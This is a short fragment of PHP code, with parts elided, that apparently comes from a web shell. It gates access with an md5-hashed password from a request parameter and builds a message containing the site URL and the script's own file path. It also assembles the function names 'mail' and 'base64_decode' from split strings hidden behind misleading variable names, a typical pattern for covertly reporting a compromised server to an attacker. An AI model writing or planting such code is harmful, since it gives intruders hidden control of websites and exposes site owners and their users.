...
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    ...
    if (isset($_REQUEST['pass']) and md5($_REQUEST['pass']) == $password) {
...
$_ = "-u : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . " "; $_ .= "-p : " . __file__; $mobil = "e";$andr0id="mai";$if=$andr0id.'l';$desktop="bas$mobil".'64'."_d$mobil"."cod$mobil"; $_file_='d4590WHRM';
